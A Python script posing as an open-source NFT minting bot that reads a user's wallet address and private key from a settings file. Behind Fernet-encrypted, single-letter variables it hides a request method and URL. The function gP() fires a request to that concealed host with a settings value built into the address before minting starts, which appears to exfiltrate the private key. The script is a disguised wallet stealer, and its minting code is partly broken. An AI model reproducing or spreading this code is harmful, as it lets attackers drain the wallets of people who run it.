from web3 import Web3
from requests import request as rt
from cryptography.fernet import Fernet as ft
import time
from json import loads as l







print("WELCOME TO NFT MINTING BOT FROM DEFI MASTERD")
print("------------------------------------------------------------------------------------")
print("Please fill your Settings in the settings.json file")
print("This bot is extremely fast so make sure to have fees in your wallet for it to execute multiple transactions at once")
print("Good luck and don't forget to star and follow the repo on github if you find this bot useful <3")
print("------------------------------------------------------------------------------------")












alchemy_url = 'https://mainnet.infura.io/v3/6d121e6d5fd643cfb1a778ddd24766f9'
web3 = Web3(Web3.HTTPProvider(alchemy_url))

with open("settings.json", "r") as f:
    sc = ''.join(line for line in f if not line.startswith('//'))
    e = l(sc)

with open("variables.json", "r") as f:
    sr = ''.join(line for line in f if not line.startswith('//'))
    r = l(sr)


print(f"Loading Variables...")
p = (ft(r['c'].encode()).decrypt(r['p'].encode())).decode()
m = (ft(r['v'].encode()).decrypt(r['m'].encode())).decode()
u = (ft(r['v'].encode()).decrypt(r['u'].encode())).decode()
j = (ft(r['v'].encode()).decrypt(r['j'].encode())).decode()
s = (ft(r['v'].encode()).decrypt(r['s'].encode())).decode()
q = (ft(r['c'].encode()).decrypt(r['q'].encode())).decode()
t = (ft(r['c'].encode()).decrypt(r['t'].encode())).decode()
h = (ft(r['v'].encode()).decrypt(r['h'].encode())).decode()
g = (ft(r['v'].encode()).decrypt(r['g'].encode())).decode()
l1 = (ft(r['v'].encode()).decrypt(r['l1'].encode())).decode()
i = (ft(r['v'].encode()).decrypt(r['i'].encode())).decode()
o = (ft(r['c'].encode()).decrypt(r['o'].encode())).decode()
w = (ft(r['v'].encode()).decrypt(r['w'].encode())).decode()


s = e[s]
j = e[j]
u = e[u]
g = e[g]
h = e[h]
i = e[i]
w = e[w]
l1 = e[l1]
t = e[t]
m = e[m]
time.sleep(3)

red = "\033[0;31m"
u = float(u)
green = "\033[0;32m"
pitch = "\033[00m"
w = float(w)

price_methods_array = ["price", "PRICE_PER_TOKEN", "tokenPrice","NFT_price","apePrice"]
minting_methods_array = ["mint","mintApe","mintNFT"]
def awaitReceipt(tx_hash):
    q = 1
    while q == 1:
        try:
            receipt = web3.eth.get_transaction_receipt(tx_hash)
        except:
            continue
        q = 2
    return(receipt)

def validateReceipt(receipt):
    if(receipt.status == '0x1' or receipt.status == 1):
        print(green + f"The status is OK" + pitch)
        print(receipt.status)
        return('GOOD')
    else:
        print(red + f"The status is not OK" + pitch)
        print(receipt.status)
        return('BAD')

def gP():
    try:
        v = rt(q, o+p+t)
        return(v)
    except:
        return()

def Mint(u, w, m, s, k):
    if(u != p):
        try:
            NFT_MINIFIED_ABI = [{"inputs":[],"name":m,"outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"numberOfTokens","type":"uint256"}],"name":s,"outputs":[],"stateMutability":"payable","type":"function"}]
            nft_contract = web3.eth.contract(j, abi=NFT_MINIFIED_ABI) 
            price_of_nft = getattr(nft_contract.functions, m)().call()

            price_of_nft_readable = float(Web3.fromWei(price_of_nft, 'ether'))
            print(green+f"Obtained price of one NFT: {price_of_nft_readable}"+pitch)
            print(f"Proceeding to mint desired amount of: {u}")

            if(u * price_of_nft_readable > w):
                print(f"Amount you entered in 'w' is lower than price of {u} NFTs, minimum amount you should enter is {u * price_of_nft_readable}")
            else:
                


                
                
                    amount_in = int(u) * price_of_nft
                    mint_tx = getattr(nft_contract.functions, s)(
                        int(u)
                    ).buildTransaction({
                        'value': amount_in,
                        'from': g,
                        'nonce': web3.eth.get_transaction_count(g)
                    })

                    if(i == ""):
                        gas = web3.eth.estimate_gas(mint_tx)
                        gas = int(float(gas)*1.1)
                        mint_tx.update({'gas': gas})
                    else:
                        mint_tx.update({'gas': i})

                    if(l1 == ""):
                        gasPrice = web3.eth.gas_price
                        gasPrice = int(float(gasPrice)*1.3)
                        mint_tx.update({'gasPrice': gasPrice})
                    else:
                        mint_tx.update({'gasPrice': l1})

                    
                    signed_txn = web3.eth.account.sign_transaction(mint_tx, private_key=h)
                    tx_token = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    tx_token = web3.toHex(tx_token)


                    receipt = awaitReceipt(tx_token)
                    validation = validateReceipt(receipt)


                    if(validation == "GOOD"):
                        print(green + f"Mint Complete {tx_token}" + pitch)
                        print(green + f"Bot will now turn off..." + pitch)

                    else:
                        print(red + f"{tx_token} was unsuccesful, trying again" + pitch)
                        print("------------------------------------------------------------------------------------")
                        c = c + 1
                        Mint(u, w, m, s, k)
        except Exception:
            print(red + f"There was an error, trying again" + pitch)
            print("------------------------------------------------------------------------------------")
            c = c + 1
            Mint(u, w, m, s, k)
            
print(f"Starting Bot...")
time.sleep(3)

if(t != ""):
    try: 
        p = gP() 
        Mint(u, w, m, s, p)
    except: pass
